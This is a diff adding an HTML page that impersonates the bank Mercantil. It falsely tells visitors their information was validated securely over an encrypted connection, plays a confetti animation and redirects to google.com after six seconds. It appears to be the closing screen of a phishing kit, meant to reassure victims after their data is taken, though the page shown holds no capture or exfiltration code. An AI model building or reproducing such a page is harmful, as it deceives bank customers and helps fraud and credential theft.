@@ -1,0 +1,261 @@
+<html lang="es"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mercantil</title>
+
+<meta http-equiv="refresh" content="6;url=https://www.google.com/">
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&amp;display=swap" rel="stylesheet">
+
+<style>
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  height: 100vh;
+  font-family: 'Inter', sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: linear-gradient(135deg, #001f3f, #004e9b);
+}
+
+/* HEADER LOGO */
+.header {
+  position: absolute;
+  top: 30px;
+  display: flex;
+  gap: 20px;
+  align-items: center;
+}
+
+.header img {
+  height: 65px;
+  opacity: 0.95;
+}
+
+/* CARD */
+.card {
+  background: rgba(255,255,255,0.08);
+  backdrop-filter: blur(14px);
+  padding: 45px 60px;
+  border-radius: 20px;
+  text-align: center;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+  border: 1px solid rgba(255,255,255,0.15);
+  animation: fadeIn 0.6s ease;
+}
+
+/* ICON SUCCESS */
+.success-icon {
+  width: 90px;
+  height: 90px;
+  border-radius: 50%;
+  background: rgba(77,163,255,0.15);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  margin: 0 auto 20px;
+  box-shadow: 0 0 25px rgba(77,163,255,0.4);
+}
+
+.success-icon::before {
+  content: "✔";
+  font-size: 40px;
+  color: #4da3ff;
+}
+
+/* TEXTOS */
+.title {
+  font-size: 20px;
+  color: #ffffff;
+  font-weight: 600;
+  margin-bottom: 10px;
+}
+
+.subtitle {
+  font-size: 15px;
+  color: rgba(255,255,255,0.75);
+  margin-bottom: 20px;
+}
+
+/* SECURITY */
+.secure {
+  font-size: 13px;
+  color: rgba(255,255,255,0.6);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 6px;
+}
+
+.lock {
+  width: 14px;
+  height: 14px;
+  border: 2px solid #4da3ff;
+  border-radius: 3px;
+  position: relative;
+}
+
+.lock::before {
+  content: "";
+  position: absolute;
+  top: -7px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 10px;
+  height: 6px;
+  border: 2px solid #4da3ff;
+  border-bottom: none;
+  border-radius: 10px 10px 0 0;
+}
+
+/* LOADING DOTS */
+.redirect {
+  margin-top: 15px;
+  font-size: 13px;
+  color: rgba(255,255,255,0.6);
+}
+
+.redirect::after {
+  content: "";
+  animation: dots 1.5s infinite steps(4,end);
+}
+
+/* CONFETTI CANVAS */
+canvas {
+  position: fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  pointer-events:none;
+}
+
+/* ANIMATIONS */
+@keyframes fadeIn {
+  from { opacity:0; transform: translateY(10px); }
+  to { opacity:1; transform: translateY(0); }
+}
+
+@keyframes dots {
+  0% { content:""; }
+  25% { content:"."; }
+  50% { content:".."; }
+  75% { content:"..."; }
+}
+
+  .logo-wrapper img,
+.iso-wrapper img {
+    width: 88px !important;
+    height: auto !important;
+    max-width: 120px !important;
+    margin-left: 105px !important;
+}
+
+</style>
+</head>
+
+<body __processed_4dfc4c50-8250-4619-8802-8ae72736dfac__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMi4xIiwic2NvcmUiOjIwMjAxMH1d">
+
+<!-- LOGOS -->
+<div class="header" bis_skin_checked="1">
+  <img src="logotauro.svg" alt="Mercantil">
+  <!-- puedes añadir otro logo si quieres -->
+</div>
+
+<!-- CARD -->
+<div class="card" bis_skin_checked="1">
+
+  <div class="success-icon" bis_skin_checked="1"></div>
+
+  <div class="title" bis_skin_checked="1">
+    Operación verificada correctamente
+  </div>
+
+  <div class="subtitle" bis_skin_checked="1">
+    Tu información ha sido validada de forma segura.
+  </div>
+
+  <div class="secure" bis_skin_checked="1">
+    <div class="lock" bis_skin_checked="1"></div>
+    Conexión cifrada protegida
+  </div>
+
+  <div class="redirect" bis_skin_checked="1">
+    Redirigiendo automáticamente
+  </div>
+
+</div>
+
+<canvas id="confetti-canvas" width="530" height="552"></canvas>
+
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  const canvas = document.getElementById('confetti-canvas');
+  const ctx = canvas.getContext('2d');
+  let W = window.innerWidth;
+  let H = window.innerHeight;
+  canvas.width = W;
+  canvas.height = H;
+
+  const duration = 2500; // más corto = más elegante
+  const gravity = 0.2;
+  const confettis = [];
+
+  function randomColor() {
+    const colors = ['#4da3ff', '#f58220', '#ffffff'];
+    return colors[Math.floor(Math.random() * colors.length)];
+  }
+
+  function createConfetti() {
+    for (let i = 0; i < 4; i++) { // menos cantidad
+      confettis.push({
+        x: W / 2,
+        y: H / 2,
+        r: Math.random() * 5 + 2,
+        color: randomColor(),
+        angle: Math.random() * 2 * Math.PI,
+        speed: Math.random() * 2 + 0.5,
+        alpha: 1
+      });
+    }
+  }
+
+  const startTime = performance.now();
+  const emitter = setInterval(() => {
+    if (performance.now() - startTime >= duration) {
+      clearInterval(emitter);
+    } else {
+      createConfetti();
+    }
+  }, 120);
+
+  function animate() {
+    ctx.clearRect(0, 0, W, H);
+    confettis.forEach((c) => {
+      c.x += Math.cos(c.angle) * c.speed;
+      c.y += Math.sin(c.angle) * c.speed + gravity;
+      c.alpha -= 0.01;
+
+      ctx.beginPath();
+      ctx.globalAlpha = Math.max(c.alpha, 0);
+      ctx.fillStyle = c.color;
+      ctx.arc(c.x, c.y, c.r, 0, Math.PI * 2);
+      ctx.fill();
+    });
+
+    ctx.globalAlpha = 1;
+    requestAnimationFrame(animate);
+  }
+
+  animate();
+});
+</script>
+
+
+
+</body></html>
